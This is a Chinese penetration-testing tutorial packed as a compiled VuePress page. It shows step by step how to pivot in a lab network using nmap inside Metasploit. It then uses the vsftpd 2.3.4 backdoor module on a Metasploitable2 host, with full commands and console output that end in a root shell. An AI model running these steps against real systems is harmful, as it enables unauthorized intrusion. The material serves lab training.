import{i as e,r as t,s as n,t as r}from"./app-DXydreKv.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-025-%E4%BD%BF%E7%94%A8Metasploit%E4%B8%AD%E7%9A%84NMap%E6%8F%92%E4%BB%B6%E6%89%AB%E6%8F%8F%E5%B9%B6%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA.html","title":"使用Metasploit中的NMap插件扫描并渗透内网主机","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"使用Metasploit中的NMap插件扫描并渗透内网主机","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"使用Metasploit中的NMap插件扫描并渗透内网主机","lock":"need"},"git":{"updatedTime":1777472572000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"3a2388c47edaa4c754a2b5eb62c0f47b36b02084","time":1777472572000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-025-使用Metasploit中的NMap插件扫描并渗透内网主机.md"}`),a={name:`2022-05-02-025-使用Metasploit中的NMap插件扫描并渗透内网主机.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="使用metasploit中的nmap插件扫描并渗透内网主机" tabindex="-1"><a class="header-anchor" href="#使用metasploit中的nmap插件扫描并渗透内网主机"><span>使用Metasploit中的NMap插件扫描并渗透内网主机</span></a></h1><p>攻击机： Kali 192.168.175.128</p><p>靶机： WinXP 192.168.175.130</p><p>内网主机： Metasploitable2 192.168.175.131</p><p>在上一篇《<a href="https://blog.csdn.net/l1028386804/article/details/86607498" target="_blank" rel="noopener noreferrer">Metasploit实战三之——使用Metasploit获取目标的控制权限</a>》一文中，我们已经拿下了靶机的控制权限，并通过arp命令得知：内网中有一台IP为192.168.175.131的主机。接下来，我们首先使用NMap对这个主机进行扫描。</p><h3 id="开启msf终端" tabindex="-1"><a class="header-anchor" href="#开启msf终端"><span>开启MSF终端</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="扫描内网主机" tabindex="-1"><a class="header-anchor" href="#扫描内网主机"><span>扫描内网主机</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">nmap -sV 192.168.175.131</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>结果如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf5 &gt; nmap -sV 192.168.175.131</span>
<span class="line">[*] exec: nmap -sV 192.168.175.131</span>
<span class="line"></span>
<span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-23 12:28 CST</span>
<span class="line">Nmap scan report for 192.168.175.131</span>
<span class="line">Host is up (0.0029s latency).</span>
<span class="line">Not shown: 977 closed ports</span>
<span class="line">PORT     STATE SERVICE     VERSION</span>
<span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span>
<span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span>
<span class="line">23/tcp   open  telnet      Linux telnetd</span>
<span class="line">25/tcp   open  smtp        Postfix smtpd</span>
<span class="line">53/tcp   open  domain      ISC BIND 9.4.2</span>
<span class="line">80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</span>
<span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span>
<span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
<span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
<span class="line">512/tcp  open  exec        netkit-rsh rexecd</span>
<span class="line">513/tcp  open  login       OpenBSD or Solaris rlogind</span>
<span class="line">514/tcp  open  tcpwrapped</span>
<span class="line">1099/tcp open  rmiregistry GNU Classpath grmiregistry</span>
<span class="line">1524/tcp open  bindshell   Metasploitable root shell</span>
<span class="line">2049/tcp open  nfs         2-4 (RPC #100003)</span>
<span class="line">2121/tcp open  ftp         ProFTPD 1.3.1</span>
<span class="line">3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5</span>
<span class="line">5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7</span>
<span class="line">5900/tcp open  vnc         VNC (protocol 3.3)</span>
<span class="line">6000/tcp open  X11         (access denied)</span>
<span class="line">6667/tcp open  irc         UnrealIRCd</span>
<span class="line">8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)</span>
<span class="line">8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span>
<span class="line">MAC Address: 00:0C:29:CF:F6:AC (VMware)</span>
<span class="line">Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span>
<span class="line"></span>
<span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里，我们利用 vsftpd 2.3.4的漏洞来攻破内网主机。</p><h3 id="利用利用-vsftpd-2-3-4的漏洞来攻破内网主机" tabindex="-1"><a class="header-anchor" href="#利用利用-vsftpd-2-3-4的漏洞来攻破内网主机"><span>利用利用 vsftpd 2.3.4的漏洞来攻破内网主机</span></a></h3><h4 id="搜索vsftpd-2-3-4漏洞" tabindex="-1"><a class="header-anchor" href="#搜索vsftpd-2-3-4漏洞"><span>搜索vsftpd 2.3.4漏洞</span></a></h4><p>这里，使用search vsftpd 2.3.4命令，如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf5 &gt; search vsftpd 2.3.4</span>
<span class="line"></span>
<span class="line">Matching Modules</span>
<span class="line">================</span>
<span class="line"></span>
<span class="line">   Name                                                      Disclosure Date  Rank       Check  Description</span>
<span class="line">   ----                                                      ---------------  ----       -----  -----------</span>
<span class="line">   auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials</span>
<span class="line">   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution</span>
<span class="line">   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection</span>
<span class="line">   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="准备攻击" tabindex="-1"><a class="header-anchor" href="#准备攻击"><span>准备攻击</span></a></h4><p>这里，我们依次输入以下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">search vsftpd 2.3.4</span>
<span class="line">use exploit/unix/ftp/vsftpd_234_backdoor </span>
<span class="line">show options</span>
<span class="line">set RHOSTS 192.168.175.131</span>
<span class="line">show payloads</span>
<span class="line">set payload cmd/unix/interact </span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf5 &gt; search vsftpd 2.3.4</span>
<span class="line"></span>
<span class="line">Matching Modules</span>
<span class="line">================</span>
<span class="line"></span>
<span class="line">   Name                                                      Disclosure Date  Rank       Check  Description</span>
<span class="line">   ----                                                      ---------------  ----       -----  -----------</span>
<span class="line">   auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials</span>
<span class="line">   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution</span>
<span class="line">   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection</span>
<span class="line">   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor </span>
<span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span>
<span class="line"></span>
<span class="line">   Name    Current Setting  Required  Description</span>
<span class="line">   ----    ---------------  --------  -----------</span>
<span class="line">   RHOSTS                   yes       The target address range or CIDR identifier</span>
<span class="line">   RPORT   21               yes       The target port (TCP)</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Automatic</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.175.131</span>
<span class="line">RHOSTS =&gt; 192.168.175.131</span>
<span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show payloads</span>
<span class="line"></span>
<span class="line">Compatible Payloads</span>
<span class="line">===================</span>
<span class="line"></span>
<span class="line">   Name               Disclosure Date  Rank    Check  Description</span>
<span class="line">   ----               ---------------  ----    -----  -----------</span>
<span class="line">   cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection</span>
<span class="line"></span>
<span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set payload cmd/unix/interact </span>
<span class="line">payload =&gt; cmd/unix/interact</span>
<span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit</span>
<span class="line"></span>
<span class="line">[*] 192.168.175.131:21 - Banner: 220 (vsFTPd 2.3.4)</span>
<span class="line">[*] 192.168.175.131:21 - USER: 331 Please specify the password.</span>
<span class="line">[+] 192.168.175.131:21 - Backdoor service has been spawned, handling...</span>
<span class="line">[+] 192.168.175.131:21 - UID: uid=0(root) gid=0(root)</span>
<span class="line">[*] Found shell.</span>
<span class="line">[*] Command shell session 1 opened (192.168.175.128:44413 -&gt; 192.168.175.131:6200) at 2019-01-23 14:00:16 +0800</span>
<span class="line"></span>
<span class="line">ifconfig</span>
<span class="line">eth0      Link encap:Ethernet  HWaddr 00:0c:29:cf:f6:ac  </span>
<span class="line">          inet addr:192.168.175.131  Bcast:192.168.175.255  Mask:255.255.255.0</span>
<span class="line">          inet6 addr: fe80::20c:29ff:fecf:f6ac/64 Scope:Link</span>
<span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span>
<span class="line">          RX packets:5408 errors:0 dropped:0 overruns:0 frame:0</span>
<span class="line">          TX packets:2778 errors:0 dropped:0 overruns:0 carrier:0</span>
<span class="line">          collisions:0 txqueuelen:1000 </span>
<span class="line">          RX bytes:368033 (359.4 KB)  TX bytes:249606 (243.7 KB)</span>
<span class="line">          Interrupt:19 Base address:0x2000 </span>
<span class="line"></span>
<span class="line">lo        Link encap:Local Loopback  </span>
<span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span>
<span class="line">          inet6 addr: ::1/128 Scope:Host</span>
<span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span>
<span class="line">          RX packets:766 errors:0 dropped:0 overruns:0 frame:0</span>
<span class="line">          TX packets:766 errors:0 dropped:0 overruns:0 carrier:0</span>
<span class="line">          collisions:0 txqueuelen:0 </span>
<span class="line">          RX bytes:349561 (341.3 KB)  TX bytes:349561 (341.3 KB)</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样，我们就通过NMap扫描目标主机，并通过Metasploit攻击vsftpd 2.3.4漏洞拿下了内网服务器的权限。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,25)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};